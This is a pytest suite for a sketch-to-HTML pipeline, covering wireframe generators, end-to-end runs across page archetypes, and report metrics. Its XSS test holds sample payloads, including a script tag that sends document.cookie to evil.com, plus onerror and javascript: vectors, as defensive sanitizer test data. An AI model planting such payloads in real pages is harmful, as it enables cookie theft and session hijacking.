"""
tests/test_e2e_system.py

Unit and End-to-End System Integration test suite for Week 12 Deliverable (COM71123-14):
End-to-End Testing of the Complete System.

Covers:
1. Synthetic procedural wireframe generation (auth, ecommerce, dashboard, landing, blank).
2. End-to-end pipeline execution across layout archetypes:
   - OpenCV contour preprocessing
   - Multimodal code synthesis
   - AST validation (html-validate)
   - Self-correction refinement
   - WCAG 2.1 AA accessibility enforcement
   - DOMPurify security sanitization
3. Edge-case resilience (blank canvases, sparse contours).
4. End-to-end multi-vector XSS defense.
5. Report structure, metrics, and audit generation.
"""

from pathlib import Path
import pytest
import numpy as np

from src.e2e_testing import (
    SyntheticWireframeGenerator,
    E2ESystemTester,
    E2ETestResult,
    E2EReport
)
from src.pipeline import SketchToCodePipeline
from src.model_router import RoutingStrategy
from src.security import SecuritySanitizer
from src.accessibility import AccessibilityEnforcer


@pytest.fixture
def pipeline():
    return SketchToCodePipeline(strategy=RoutingStrategy.MOCK)


@pytest.fixture
def tester():
    return E2ESystemTester(base_url="http://localhost:8000")


# ==============================================================================
# 1. Procedural Synthetic Wireframe Generation Tests
# ==============================================================================

def test_synthetic_wireframe_generators():
    """Verifies that procedural wireframe generators produce valid numpy images."""
    for generator in [
        SyntheticWireframeGenerator.create_auth_wireframe,
        SyntheticWireframeGenerator.create_ecommerce_wireframe,
        SyntheticWireframeGenerator.create_dashboard_wireframe,
        SyntheticWireframeGenerator.create_landing_wireframe,
        SyntheticWireframeGenerator.create_blank_wireframe
    ]:
        img = generator(800, 800)
        assert isinstance(img, np.ndarray)
        assert img.shape == (800, 800, 3)
        assert img.dtype == np.uint8

        uri = SyntheticWireframeGenerator.to_base64_data_uri(img)
        assert uri.startswith("data:image/png;base64,")
        assert len(uri) > 100


# ==============================================================================
# 2. Complete Pipeline E2E Lifecycle Tests across Archetypes
# ==============================================================================

def test_e2e_pipeline_lifecycle_landing(pipeline):
    """End-to-end pipeline test on SaaS Landing Page archetype."""
    img = SyntheticWireframeGenerator.create_landing_wireframe()
    result = pipeline.process(img, force_mock=True)

    assert result.success is True
    assert result.ast_valid_initially is True
    assert result.accessibility_compliant is True
    assert result.security_sanitized is True
    assert "<!DOCTYPE html>" in result.full_html
    assert "<nav" in result.full_html.lower() or "navbar" in result.full_html.lower()
    assert result.accessibility_score >= 90.0


def test_e2e_pipeline_lifecycle_auth(pipeline):
    """End-to-end pipeline test on Authentication Modal archetype."""
    img = SyntheticWireframeGenerator.create_auth_wireframe()
    result = pipeline.process(img, force_mock=True)

    assert result.success is True
    assert result.ast_valid_initially is True
    assert result.accessibility_compliant is True
    assert result.security_sanitized is True
    assert "<!DOCTYPE html>" in result.full_html
    assert "<form" in result.full_html.lower() or "input" in result.full_html.lower()


def test_e2e_pipeline_lifecycle_ecommerce(pipeline):
    """End-to-end pipeline test on E-Commerce Grid archetype."""
    img = SyntheticWireframeGenerator.create_ecommerce_wireframe()
    result = pipeline.process(img, force_mock=True)

    assert result.success is True
    assert result.ast_valid_initially is True
    assert result.accessibility_compliant is True
    assert result.security_sanitized is True
    assert "<!DOCTYPE html>" in result.full_html


def test_e2e_pipeline_lifecycle_dashboard(pipeline):
    """End-to-end pipeline test on Admin Analytics Dashboard archetype."""
    img = SyntheticWireframeGenerator.create_dashboard_wireframe()
    result = pipeline.process(img, force_mock=True)

    assert result.success is True
    assert result.ast_valid_initially is True
    assert result.accessibility_compliant is True
    assert result.security_sanitized is True
    assert "<!DOCTYPE html>" in result.full_html


# ==============================================================================
# 3. Robustness & Edge-Case Tests
# ==============================================================================

def test_e2e_blank_wireframe_resilience(pipeline):
    """Verifies that an empty sketch paper does not cause pipeline failure."""
    img = SyntheticWireframeGenerator.create_blank_wireframe()
    result = pipeline.process(img, force_mock=True)

    assert result.success is True
    assert len(result.full_html) > 50
    assert result.ast_valid_initially is True


def test_e2e_physical_sample_wireframe(pipeline):
    """Verifies execution on repository sample wireframe image file."""
    sample_file = Path("tests/sample_wireframe.png")
    if not sample_file.exists():
        pytest.skip("tests/sample_wireframe.png not present")

    result = pipeline.process(str(sample_file), force_mock=True)
    assert result.success is True
    assert result.ast_valid_initially is True
    assert result.security_sanitized is True


# ==============================================================================
# 4. End-to-End Security Sanitization Tests
# ==============================================================================

def test_e2e_security_xss_neutralization():
    """Verifies end-to-end defanging of stored XSS scripts and pseudo-protocols."""
    enforcer = AccessibilityEnforcer()
    sanitizer = SecuritySanitizer()

    dirty_html = (
        "<!DOCTYPE html><html><head><title>Secure Test</title></head><body>"
        "<main role='main'>"
        "<h1>Safe Page</h1>"
        "<script>document.location='http://evil.com/steal?cookie=' + document.cookie</script>"
        "<img src='nonexistent.png' onerror='alert(\"XSS Attack\")' alt='User Profile'>"
        "<a href='javascript:void(0)'>Action Link</a>"
        "</main></body></html>"
    )

    remediated, _ = enforcer.enforce_accessibility(dirty_html)
    sec_report = sanitizer.sanitize(remediated)

    assert "<script" not in sec_report.clean_html.lower()
    assert "onerror" not in sec_report.clean_html.lower()
    assert "javascript:" not in sec_report.clean_html.lower()
    assert sec_report.is_secure is True
    assert sec_report.threats_detected >= 3


# ==============================================================================
# 5. E2E Report Structure & Metrics
# ==============================================================================

def test_e2e_report_structure():
    """Verifies dataclass serialization and pass rate calculations."""
    results = [
        E2ETestResult(
            test_name="Test 1",
            category="pipeline",
            passed=True,
            duration_ms=120.0,
            details={"ok": True}
        ),
        E2ETestResult(
            test_name="Test 2",
            category="api",
            passed=True,
            duration_ms=45.0,
            details={"status": 200}
        )
    ]
    report = E2EReport(
        timestamp="2026-11-11 19:40:00",
        total_tests=2,
        passed_tests=2,
        failed_tests=0,
        pass_rate_percentage=100.0,
        results=results
    )
    d = report.to_dict()
    assert d["total_tests"] == 2
    assert d["passed_tests"] == 2
    assert d["pass_rate_percentage"] == 100.0
    assert len(d["results"]) == 2
